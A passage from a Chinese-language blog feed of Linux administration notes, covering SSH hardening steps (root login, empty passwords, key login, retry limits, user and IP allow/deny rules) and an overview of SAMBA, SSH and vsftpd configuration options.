src=\"/assets/liunx-ssh-2.png\" alt=\"SSH 服务安全配置\"></p>\n<p>使用配置端口连接, <code>Connection Format:</code></p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>连接成功则会显示</p>\n<div><pre><code>Last login: <span>[</span>date<span>]</span> from <span>[</span>host <span>|</span> ip<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-3.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"禁止-root-用户登录\" tabindex=\"-1\"> 禁止 root 用户登录</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># PermitRootLogin yes</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认情况下是允许 root 用户登录的, 是十分不安全, 毕竟 root 用户权限太大了。我们可以去除 #, 将 yes 修改成 no, 这就禁止了 root 用户登录。</p>\n<p><code>Example Configuration:</code></p>\n<div><pre><code>PermitRootLogin no\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ssh-4.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-1\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。我们已经禁止 root 用户登录了, 以下测试例子仍然使用 root 用户进行验证。</p>\n<p>由于之前配置过端口号, 这时候就要使用配置的端口号了, <code>Connection Format:</code></p>\n<div><pre><code><span>ssh</span> root@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>使用 <code>exit</code> 可以退出当前的连接, 退出成功将会显示</p>\n<div><pre><code>Connection to <span>[</span>host <span>|</span> ip<span>]</span> closed\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-5.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"禁止空密码登录\" tabindex=\"-1\"> 禁止空密码登录</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># PermitEmptyPasswords no</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认情况下, SSH 已经禁止了使用空密码登录系统, 即使配置文件中将其注释掉。如果被设置成 yes, 则就是不安全的, 我们可以修改成 no。</p>\n<p><code>Example Configuration:</code></p>\n<div><pre><code>PermitEmptyPasswords no\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ssh-6.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-2\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。我们已经禁止 root 用户登录了, 以下测试我们将使用普通用户。注意: 使用普通用户之前, 先确保服务端是有该用户的。</p>\n<p>由于之前配置过端口号, 这时候就要使用配置的端口号了, <code>Connection Format:</code></p>\n<div><pre><code><span>ssh</span> <span>[</span>userName<span>]</span>@<span>[</span>host <span>|</span> ip<span>]</span> -p <span>[</span>port<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>如果是第一次连接的话, 会提示是否保存密钥信息, 输入 <code>yes</code> 就好。</p>\n<p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-7.png\" alt=\"SSH 服务安全配置\"></p>\n<p>断开连接, 我们尝试使用空密码连接, 只需回车就好</p>\n<p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-8.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"设置必需使用密码登录\" tabindex=\"-1\"> 设置必需使用密码登录</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># PasswordAuthentication yes</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的配置就是需要使用密码登录的, 即使它是注释的。若遇到配置值为 no 的, 一定要修改成 yes。</p>\n<p><code>Example Configuration:</code></p>\n<div><pre><code>PasswordAuthentication <span>yes</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"使用客户端进行验证-3\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>前面已经验证过了, 这里不再重复</p>\n<h3 id=\"设置仅允许密钥登录\" tabindex=\"-1\"> 设置仅允许密钥登录</h3>\n<div><p>注意</p>\n<p>密钥登录是与密码登录是不一样的。只允许密钥登录的时候必须要把允许密码登录的选项禁用。</p>\n</div>\n<p><code>For Example:</code></p>\n<div><pre><code>PasswordAuthentication no\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>接下来就是将下图所示的注释去掉, 就好了<br></p>\n<h4 id=\"免密码登录\" tabindex=\"-1\"> 免密码登录</h4>\n<p>主机生成密钥对（包含公钥和私钥）</p>\n<div><pre><code>ssh-keygen -t rsa -P <span>\"\"</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>把本地主机的公钥复制到远程主机的 <code>authorized_keys</code> 文件上</p>\n<div><pre><code>ssh-copy-id <span>[</span>user<span>]</span>@<span>[</span>server<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"限制登录失败之后重试次数\" tabindex=\"-1\"> 限制登录失败之后重试次数</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># MaxAuthTries 6</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认情况下可以重试 6 次, 如果你觉得这个不合理, 当然可以修改它。同理将 # 去除, 将 6 修改成我们想要的次数。</p>\n<p><code>Example Configuration:</code></p>\n<div><pre><code>MaxAuthTries <span>3</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ssh-9.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-4\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。之前我们在服务器上新建了一个用户, 那么我们将用这个用户进行连接。</p>\n<p>当我们输入错误的密码时, 则会显示</p>\n<div><pre><code>Permission denied, please try again.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>当我们最后一次输入错误的密码时, 则会显示</p>\n<div><pre><code>Permission denied <span>(</span>publickey,gssapi-with-mic,password<span>)</span>.\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-10.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"设置多长时间没有成功连接上-就断线\" tabindex=\"-1\"> 设置多长时间没有成功连接上, 就断线</h3>\n<p><code>Default Configuration:</code></p>\n<div><pre><code><span># LoginGraceTime 2m</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p>默认的等待时间为 2 分钟, 如果没有单位将以秒作为单位, 可用的单位分别为 h, m、s。我们可以根据需求修改, 当然是越短越安全。</p>\n<p><code>Example Configuration:</code></p>\n<div><pre><code>LoginGraceTime 10s\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><img src=\"/assets/liunx-ssh-11.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-5\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。之前我们在服务器上新建了一个用户, 那么我们仍然使用用这个用户进行连接。</p>\n<p>我们可以输入一个错误的密码, 在等待一段时间, 按下回车, 则会显示</p>\n<div><pre><code>Connection closed by <span>[</span>host <span>|</span> ip<span>]</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-12.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"设置白名单和黑名单\" tabindex=\"-1\"> 设置白名单和黑名单</h3>\n<p>默认配置中是没有白名单和黑名单这个选项的, 我们可以自己添加上去。多个用户之间必须使用空格分割。同理, 用户组也一样。</p>\n<p><code>白名单</code></p>\n<div><pre><code>AllowUsers <span>[</span>userName<span>]</span><span>1</span> <span>[</span>userName<span>]</span><span>2</span> <span>..</span>.\nAllowGroups groupName1 groupName2 <span>..</span>.\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><code>黑名单</code></p>\n<div><pre><code>DenyUsers <span>[</span>userName<span>]</span><span>1</span> <span>[</span>userName<span>]</span><span>2</span> <span>..</span>.\nDenyGroups groupName1 groupName2 <span>..</span>.\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p><code>Example Configuration:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-13.png\" alt=\"SSH 服务安全配置\"></p>\n<h4 id=\"使用客户端进行验证-6\" tabindex=\"-1\"> 使用客户端进行验证</h4>\n<p>验证之前, 请重启服务。由于白名单与黑名单效果是一致的, 这里只提供白名单的验证测试。注意: 服务器上依然需要新建测试用户（包含设置密码, 否则, 不能登录）。</p>\n<p>这时候, 我们就需要输入正确的密码。</p>\n<p><code>Example Connection:</code> <br></p>\n<p><img src=\"/assets/liunx-ssh-14.png\" alt=\"SSH 服务安全配置\"></p>\n<h3 id=\"限制-ip-登录\" tabindex=\"-1\"> 限制 IP 登录</h3>\n<h4 id=\"方法一\" tabindex=\"-1\"> 方法一</h4>\n<p>在 <code>/etc/hosts.allow</code> 中添加 SSH 登录的 ip 或者网段, <code>For Example:</code></p>\n<div><pre><code>sshd:192.168.1.2:allow        <span># ip 地址</span>\nsshd:192.168.1.0/24:allow     <span># 网段</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><p>在 <code>/etc/hosts.deny</code> 中添加不允许 SSH 登录的 IP, <code>For Example:</code></p>\n<div><pre><code>sshd:ALL                      <span># ALL 表示除了上面允许的,其他的 ip 都拒绝登录</span>\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h4 id=\"方法二\" tabindex=\"-1\"> 方法二</h4>\n<p>使用 <code>iptables</code> , <code>For Example:</code></p>\n<div><pre><code>iptables -A INPUT -p tcp -s <span>192.168</span>.1.2 --destination-port <span>22</span> -j ACCEPT\niptables -A INPUT -p tcp --destination-port <span>22</span> -j DROP\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h4 id=\"方法三\" tabindex=\"-1\"> 方法三</h4>\n<p>修改 sshd 主配置文件 <code>/etc/ssh/sshd_config</code> , <code>For Example:</code></p>\n<div><pre><code>AllowUsers test@192.168.1.2\n</code></pre><div aria-hidden=\"true\"><div></div></div></div>",
      "image": "https://vxhly.github.io/assets/liunx-ssh-1.png",
      "date_published": "2016-09-16T11:59:15.000Z",
      "date_modified": "2022-06-11T12:24:01.000Z",
      "authors": [
        {
          "name": "星火燎原@vxhly"
        }
      ],
      "tags": [
        "liunx"
      ]
    },
    {
      "title": "Liunx 服务配置笔记（一）概述",
      "url": "https://vxhly.github.io/views/liunx/liunx-service.html",
      "id": "https://vxhly.github.io/views/liunx/liunx-service.html",
      "summary": "前言\nLiunx 的学习笔记已经推出有一段时间了, 现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容。\n\n",
      "content_html": "<div><p>前言</p>\n<p>Liunx 的学习笔记已经推出有一段时间了, 现继续推出在 Liunx 中 SAMBA 服务、SSH 服务、FTP 服务、APACHE 服务、DNS 服务的安全配置。本文就先介绍这几个服务的相关内容。</p>\n</div>\n\n<h2 id=\"samba-服务\" tabindex=\"-1\"> SAMBA 服务</h2>\n<p>即 Windows 下的共享, SAMBA 服务只不过是将 Liunx 下的文件共享给 Windows。</p>\n<h3 id=\"使用到的端口号\" tabindex=\"-1\"> 使用到的端口号</h3>\n<ul>\n<li>NetBIOS 名字服务（默认为 <code>137</code> 端口(UDP)）</li>\n<li>NetBIOS 数据报服务（默认为 <code>138</code> 端口(UDP)）</li>\n<li>文件和打印共享（默认为 <code>139</code> 端口(TCP)）</li>\n<li>NetBIOS 服务在 windos 2000 及以后版本使用此端口（默认为 <code>445</code> 端口(TCP)）</li>\n</ul>\n<h3 id=\"所需软件\" tabindex=\"-1\"> 所需软件</h3>\n<ul>\n<li><strong>samba</strong></li>\n</ul>\n<p>-- 这个软件主要包含了 SAMBA 的主要 daemon 文件（smbd 及 nmbd）、SAMBA 的文件（document）与 SAMBA 相关的 logrotate 设置文件及开机默认选项文件等。</p>\n<ul>\n<li><strong>samba-common</strong></li>\n</ul>\n<p>-- 这个软件主要提供了 SAMBA 的主要配置文件（smb.conf）、smb.conf 语法检验的测试程序（testparm）等</p>\n<ul>\n<li><strong>samba-client</strong></li>\n</ul>\n<p>-- 这个软件提供了当 Liunx 作为 SAMBA 客户端时, 所需的工具指令, 例如挂载 SAMBA 文件格式的执行文件 smbmount 等</p>\n<h3 id=\"主配置文件\" tabindex=\"-1\"> 主配置文件</h3>\n<ul>\n<li><strong>/etc/samba/smb.conf</strong></li>\n</ul>\n<p>-- 是 SAMBA 的主要配置文件, 基本上, SAMBA 就仅有这个配置文件而已, 且这个配置文件本身就是很详细的说明文件, 这个文件主要在设置工作组、NetBIOS 名称以及共享目录等。</p>\n<h3 id=\"查看主配置文件的帮助\" tabindex=\"-1\"> 查看主配置文件的帮助</h3>\n<div><pre><code><span>man</span> <span>5</span> smb.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重要选项说明\" tabindex=\"-1\"> 重要选项说明</h3>\n<h4 id=\"全局选项\" tabindex=\"-1\"> 全局选项</h4>\n<ul>\n<li><strong>workgroup = [MYGROUP]</strong></li>\n</ul>\n<p>-- 定义 samba 服务器所在的工作组或者域（如果设置 <code>security = domain</code> 的话）。</p>\n<ul>\n<li><strong>server string = [Samba server]</strong></li>\n</ul>\n<p>-- 设定 samba 服务器的描述, 通过网络邻居访问时可在备注中查看到该描述信息。</p>\n<ul>\n<li><strong>netbios name = [MyServer]</strong></li>\n</ul>\n<p>-- 主机 NetBIOS 名称, 每台机子皆不同</p>\n<ul>\n<li><strong>security = share/user/server/domain/ads</strong></li>\n</ul>\n<p>-- <strong>share</strong>: 访问 Samba 服务器共享资源时不需要输入用户名和密码, 属于匿名访问。 -- <strong>user</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为 Samba 服务器本机。 -- <strong>server</strong>: 访问 Samba 服务器共享资源时需要输入用户名和密码, 认证用户来源为另一台 Samba 服务器或 Windows 服务器。 -- <strong>domain</strong>: Samba 服务器在一个基于 Windows NT 平台的 Windows 域中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 域。 -- <strong>ads</strong>: Samba 服务器在一个基于 Windows 200X 平台的 Windows 活动目录中, 访问共享资源需要输入用户名和密码, 认证用户来源为 Windows 活动目录。</p>\n<ul>\n<li><strong>encrypt passwords = yes | no</strong></li>\n</ul>\n<p>-- 设定是否对密码进行加密。如果不对密码进行加密的话, 在认证会话期间, 客户端与服务器传递的是明文密码。</p>\n<ul>\n<li><strong>passdb backend = tdbsam/smbpasswd/ldapsam/mysql</strong></li>\n</ul>\n<p>-- <strong>tdbsam</strong>: 该方式使用一个数据库文件来建立用户数据库, 数据库文件名为 passdb.tdb 。可以使用 <code>smbpasswd -a [userName]</code> 来建立 Samba 用户。也可以使用 <code>pdbedit</code> 命令来建立用户。 -- <strong>smbpasswd</strong>: 该方式使用 Samba 提供的工具 smbpasswd 来给系统用户设置一个用于访问 Samba 服务的密码, 客户端就用这个密码访问 Samba 共享资源。此方式还要使用一个 <code>smb passwd file = /usr/local/samba/etc/smbpasswd</code> （或 <code>/etc/samba/smbpasswd</code> ） 参数来指定保存用户名和密码的文件, 该文件需要手动建立。不推荐使用此方法。 -- <strong>ldapsam</strong>: 该方式基于 LADP 的账户管理方式来验证用户, 先要建立 LDAP 服务。 -- <strong>mysql</strong>: 该方式是将 Samba 服务器的用户名和密码存储到 MySQL 数据库中。</p>\n<h4 id=\"局部设置\" tabindex=\"-1\"> 局部设置</h4>\n<ul>\n<li><strong>comment = [comment]</strong></li>\n</ul>\n<p>-- 设定共享服务的描述信息。</p>\n<ul>\n<li><strong>path = [path]</strong></li>\n</ul>\n<p>-- 设定共享服务的路径。</p>\n<ul>\n<li><strong>read only = yes | no</strong></li>\n</ul>\n<p>-- 设定该共享服务是否为只读, 该选项有一个同义选项 <code>writeable</code> 。</p>\n<ul>\n<li><strong>user = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定所有可能使用该共享服务的用户, 可以使用 <code>@group</code> 来设置群组 group 中的所有用户账号。该选项的值为列表, 不同的项目之间使用空格或逗号隔开。在设置 <code>security = share</code> 时, 客户端要访问某共享服务时提供的密码会与该选项指定的所有用户进行一一配对认证, 若某用户认证通过, 则以该用户权限进行共享服务访问, 否则拒绝客户端的访问（设置 <code>security = share</code> 不是允许游客访问, 只有 <code>guest ok = yes</code> 才是允许游客访问, 切记！！！）。</p>\n<ul>\n<li><strong>valid users = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>invalid users = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定不能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>invalid users = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定不能够使用该共享服务的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>read list = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定对该共享服务只有读取权限的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>write list = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定对该共享服务拥有读写权限的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>admin list = <a href=\"@%5BgroupName%5D\">userName</a></strong></li>\n</ul>\n<p>-- 设定对该共享服务拥有管理权限的用户和组, 其值的格式与 user 选项一样。</p>\n<ul>\n<li><strong>public = yes | no</strong></li>\n</ul>\n<p>-- 设定该共享服务是否能够被游客访问, 其同义选项有 guest ok。</p>\n<ul>\n<li><strong>create mode = mode</strong></li>\n</ul>\n<p>-- mode 为八进制值, 如 0755, 其默认值为 0744。该选项指定的值用于过滤新建文件的访问权限, 新建文件的默认权限将与 create mode 指定的值进行按位与操作, 将结果再与 force create mode 指定的值进行按位或操作, 得到的结果即为新建文件的访问权限。</p>\n<h3 id=\"服务的启动与停止\" tabindex=\"-1\"> 服务的启动与停止</h3>\n<p>SAMBA 的服务名并不叫做 <code>samba</code> , 而是 <code>smb</code> 。</p>\n<div><pre><code><span>service</span> smb status        <span># 状态</span>\n<span>service</span> smb start         <span># 启动</span>\n<span>service</span> smb stop          <span># 暂停</span>\n<span>service</span> smb restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h3 id=\"设置开机自启\" tabindex=\"-1\"> 设置开机自启</h3>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> smb   <span># 查看自启状态</span>\n<span>chkconfig</span> --level <span>35</span> smb on   <span># 设置开机自启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"ssh-服务\" tabindex=\"-1\"> SSH 服务</h2>\n<p>更安全的远程连接, 它通过对联机数据包加密的技术来进行数据传输, 因此, 数据就更安全了。</p>\n<h3 id=\"使用到的端口号-1\" tabindex=\"-1\"> 使用到的端口号</h3>\n<ul>\n<li>安全的数据传输（默认为 <strong><code>22</code></strong> 端口）</li>\n</ul>\n<h3 id=\"所需软件-1\" tabindex=\"-1\"> 所需软件</h3>\n<p>一般情况下, RedHat 已经预装了 openssh, 所以这里不做过多的阐述了</p>\n<h3 id=\"主配置文件-1\" tabindex=\"-1\"> 主配置文件</h3>\n<ul>\n<li><strong>/etc/ssh/sshd_config</strong></li>\n</ul>\n<p>-- <strong>sshd_config</strong> 是 SSH 的主要配置文件, 基本上, SSH 相关的配置都放在这里, 这个文件的默认配置项已经很完美了, 事实上不需要过多的改动。</p>\n<h3 id=\"查看主配置文件的帮助-1\" tabindex=\"-1\"> 查看主配置文件的帮助</h3>\n<div><pre><code><span>man</span> <span>5</span> sshd_config\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重要选项说明-1\" tabindex=\"-1\"> 重要选项说明</h3>\n<h4 id=\"监听相关配置\" tabindex=\"-1\"> 监听相关配置</h4>\n<ul>\n<li><strong>Port 22</strong></li>\n</ul>\n<p>-- 设置连接到远程主机的端口, 可以进行修改</p>\n<ul>\n<li><strong>ListenAddress [192.168.1.1]</strong></li>\n</ul>\n<p>-- 设置 sshd 服务器绑定的 IP 地址</p>\n<h4 id=\"密码、登录相关配置\" tabindex=\"-1\"> 密码、登录相关配置</h4>\n<ul>\n<li><strong>MaxAuthTries 3</strong></li>\n</ul>\n<p>-- 最大密码输入错误次数</p>\n<ul>\n<li><strong>PermitRootLogin no</strong></li>\n</ul>\n<p>-- 设置 root 能不能用 ssh 登录。这个选项一定不要设成 <code>“yes”</code></p>\n<ul>\n<li><strong>LoginGraceTime 600</strong></li>\n</ul>\n<p>-- 当用户连接上 SSH 时, 在输入密码界面, 设置在多长时间内没有成功连接 SSH , 就断线（若无单位默认以秒为单位）</p>\n<ul>\n<li><strong>PasswordAuthentication yes</strong></li>\n</ul>\n<p>-- 设置是否允许口令验证</p>\n<ul>\n<li><strong>PermitEmptyPasswords no</strong></li>\n</ul>\n<p>-- 设置是否允许用口令为空的帐号登录</p>\n<h4 id=\"用户限制配置\" tabindex=\"-1\"> 用户限制配置</h4>\n<ul>\n<li><strong>AllowUsers [userName]</strong></li>\n</ul>\n<p>-- 设置白名单, 可以跟着任意的数量的用户名的匹配串（patterns）或 user@host 这样的匹配串, 这些字符串用空格隔开。</p>\n<ul>\n<li><strong>AllowGroups [groupName]</strong></li>\n</ul>\n<p>-- 设置白名单, 可以跟着任意的数量的组名的匹配串（patterns）或 user@host 这样的匹配串, 这些字符串用空格隔开。</p>\n<ul>\n<li><strong>DenyUsers [userName]</strong></li>\n</ul>\n<p>-- 设置黑名单, 与 <code>AllowUsers</code> 写法一致。</p>\n<ul>\n<li><strong>DenyGroups [groupName]</strong></li>\n</ul>\n<p>-- 设置黑名单, 与 <code>AllowGroups</code> 写法一致。</p>\n<h3 id=\"服务的启动与停止-1\" tabindex=\"-1\"> 服务的启动与停止</h3>\n<div><p>提示</p>\n<p>SSh 的服务名并不叫做 <code>ssh</code> , 而是 <code>sshd</code> 。</p>\n</div>\n<div><pre><code><span>service</span> sshd status        <span># 状态</span>\n<span>service</span> sshd start         <span># 启动</span>\n<span>service</span> sshd stop          <span># 暂停</span>\n<span>service</span> sshd restart       <span># 重启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div><div></div><div></div></div></div><h4 id=\"设置开机自启-1\" tabindex=\"-1\"> 设置开机自启</h4>\n<div><pre><code><span>chkconfig</span> --list <span>|</span> <span>grep</span> sshd   <span># 查看自启状态</span>\n<span>chkconfig</span> --level <span>35</span> sshd on   <span># 设置开机自启</span>\n</code></pre><div aria-hidden=\"true\"><div></div><div></div></div></div><h2 id=\"ftp-服务\" tabindex=\"-1\"> FTP 服务</h2>\n<div><p>提示</p>\n<p>确切的说, 应该叫它 vsFTP。vsFTP 是一个基于 GPL 发布的类 Unix 系统上使用的 FTP 服务器软件, 它的全称是 <code>Very Secure FTP</code></p>\n</div>\n<h3 id=\"使用到的端口号-2\" tabindex=\"-1\"> 使用到的端口号</h3>\n<ul>\n<li>命令通道的 FTP（默认为 <strong><code>21</code></strong> 端口）</li>\n<li>数据传输的 FTP-data（默认为 <strong><code>20</code></strong> 端口）</li>\n</ul>\n<h3 id=\"所需软件-2\" tabindex=\"-1\"> 所需软件</h3>\n<ul>\n<li><strong>vsftpd</strong></li>\n</ul>\n<p>-- 这个软件主要包含了 vsFTP 的主要 daemon 文件。</p>\n<h3 id=\"主要的配置文件\" tabindex=\"-1\"> 主要的配置文件</h3>\n<ul>\n<li><strong>/etc/vsftp/vsftpd.conf</strong></li>\n</ul>\n<p>-- 严格来说, 整个 vsFTP 的配置文件就只有这一个。这个配置文件的设置是以 bash 的变量相同的设置方式来处理的, 也就是 <code>“参数=设置值”</code> 来设置的, 注意, 等号两边不能有空格。</p>\n<ul>\n<li><strong>/etc/vsftpd/chroot_list</strong></li>\n</ul>\n<p>-- 用来限制用户只能在家目录的文件, 需要在主配置文件中进行配置, 默认没有这个文件, 需要手动创建, 如果文件名不同, 主配置文件也要对其相应的修改。</p>\n<ul>\n<li><strong>/etc/vsftpd/ftpusers</strong></li>\n</ul>\n<p>-- 黑名单列表, 就是用来规定哪些用户不能登录 FTP。</p>\n<h3 id=\"查看主配置文件的帮助-2\" tabindex=\"-1\"> 查看主配置文件的帮助</h3>\n<div><pre><code><span>man</span> <span>5</span> vsftpd.conf\n</code></pre><div aria-hidden=\"true\"><div></div></div></div><h3 id=\"重要选项说明-2\" tabindex=\"-1\"> 重要选项说明</h3>\n<h4 id=\"全局设置\" tabindex=\"-1\"> 全局设置</h4>\n<ul>\n<li><strong>write_enable=YES/NO</strong></li>\n</ul>\n<p>-- 是否允许登陆用户有写权限。属于全局设置, 默认值为 YES。</p>\n<ul>\n<li><strong>data_connection_timeout=120</strong></li>\n</ul>\n<p>-- 设置建立 FTP 数据连接的超时时间, 单位为秒。默认值为 120。</p>\n<ul>\n<li><strong>idle_session_timeout=300</strong></li>\n</ul>\n<p>-- 设置多长时间不对 FTP 服务器进行任何操作, 则断开该 FTP 连接, 单位为秒。默认值为 300 。</p>\n<h4 id=\"与本地用户相关的设置值\" tabindex=\"-1\"> 与本地用户相关的设置值</h4>\n<ul>\n<li><strong>local_enable=YES/NO</strong></li>\n</ul>\n<p>-- 控制是否允许本地用户登入, YES 为允许本地用户登入, NO 为不允许。默认值为 YES。</p>\n<ul>\n<li><strong>local_umask=022</strong></li>\n</ul>\n<p>-- 本地用户新增档案时的 umask 值。默认值为 <code>077</code> 。</p>\n<ul>\n<li><strong>file_open_mode=0755</strong></li>\n</ul>\n<p>-- 本地用户上传档案后的档案权限, 与 chmod 所使用的数值相同。默认值为 <code>0666</code> 。</p>\n<ul>\n<li><strong>userlist_enable=YES/NO</strong></li>\n</ul>\n<p>-- 设置是否阻止 user_list 文件中的用户登录 FTP 服务器, 默认为 YES</p>\n<h4 id=\"与虚拟用户相关的设置值\" tabindex=\"-1\"> 与虚拟用户相关的设置值</h4>\n<ul>\n<li><strong>guest_enable=YES/NO</strong></li>\n</ul>\n<p>-- 启用虚拟用户。默认值为 NO。启用时, 非匿名用户登录的帐号, 会被当成访客, 访客在 vsFTP 中默认会取得 FTP 这个用户的权限。</p>\n<ul>\n<li><strong>guest_username=FTP</strong></li>\n</ul>\n<p>-- 在 <code>guest_enable=YES</code> 下才生效, 指定游客的身份而已。默认为 FTP。</p>\n<ul>\n<li><strong>user_config_dir=</strong></li>\n</ul>\n<p>-- 指定游客用户的配置文件存放的目录, 无默认值, 需自己定义。</p>\n<h4 id=\"与匿名用户相关的设置值\" tabindex=\"-1\"> 与匿名用户相关的设置值</h4>\n<ul>\n<li><strong>anonymous_enable=YES/NO</strong></li>\n</ul>\n<p>-- 控制是否允许匿名用户登入, YES 为允许匿名登入, NO 为不允许。</p>\n<ul>\n<li><strong>anon_upload_enable=YES/NO</strong></li>\n</ul>\n<p>-- 如果设为 YES, 则允许匿名登入者有上传文件（非目录）的权限, 只有在 <code>write_enable=YES</code> 时, 此项才有效。当然, 匿名用户必须要有对上层目录的写入权。默认值为 NO。</p>\n<ul>\n<li><strong>anon_world_readable_only=YES/NO</strong></li>\n</ul>\n<p>-- 如果设为 YES, 则允许匿名登入者下载可阅读的档案（可以下载到本机阅读, 不能直接在 FTP 服务器中打开阅读）。默认值为 YES。</p>\n<ul>\n<li><strong>anon_mkdir_write_enable=YES/NO</strong></li>\n</ul>\n<p>-- 如果设为 YES, 则允许匿名登入者有新增目录的权限, 只有在 <code>write_enable=YES</code> 时, 此项才有效。当然, 匿名用户必须要有对上层目录的写入权。默认值为 NO。</p>\n<ul>\n<li><strong>anon_other_write_enable=YES/NO</strong></li>\n</ul>\n<p>-- 如果设为 YES, 则允许匿名登入者更多于上传或者建立目录之外的权限, 譬如删除或者重命名。（如果 <code>anon_upload_enable=NO</code> , 则匿名用户不能上传文件, 但可以删除或者重命名已经存在的文件；如果 <code>anon_mkdir_write_enable=NO</code> , 则匿名用户不能上传或者新建文件夹, 但可以删除或者重命名已经存在的文件夹。）默认值为 NO。</p>\n<h4 id=\"与用户限制相关的设置值\" tabindex=\"-1\"> 与用户限制相关的设置值</h4>\n<ul>\n<li><strong>chroot_list_enable=YES/NO</strong></li>\n</ul>\n<p>-- 设置是否启用 <code>chroot_list_file</code> 配置项指定的用户列表文件。默认值为 NO。</p>\n<ul>\n<li><strong>chroot_list_file=/etc/vsftpd.chroot_list</strong></li>\n</ul>\n<p>-- 用于指定用户列表文件, 该文件用于控制哪些用户可以切换到用户家目录的上级目录。</p>\n<ul>\n<li><strong>chroot_local_user=YES/NO</strong></li>\n</ul>\n<p>-- 用于指定用户列表文件中的用户是否允许切换到上级目录。默认值为 NO。</p>\n<h3 id=\"服务的启动与停止-2\" tabindex=\"-1\"> 服务的启动与停止</h3>\n<div><p>提示</p>\n<p>FTP 的服务名并不叫做 <code>vsftp</code> , 而是 <code>vsftpd</code> 。</p>\n</div>\n<div><pre><code><span>service</span> vsftpd status        <span># 状态</span>\n<span>service</span> vsftpd start         <span># 